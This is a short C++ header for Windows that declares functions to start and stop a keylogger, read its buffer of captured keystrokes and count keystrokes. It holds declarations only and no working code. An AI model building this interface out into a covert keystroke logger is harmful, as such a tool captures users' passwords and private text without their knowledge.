#pragma once
#include <windows.h>
#include <string>
#include <atomic>

void IniciarKeylogger();
void DetenerKeylogger();
std::wstring ObtenerBufferTeclas();
extern std::atomic<int> g_teclas_contador;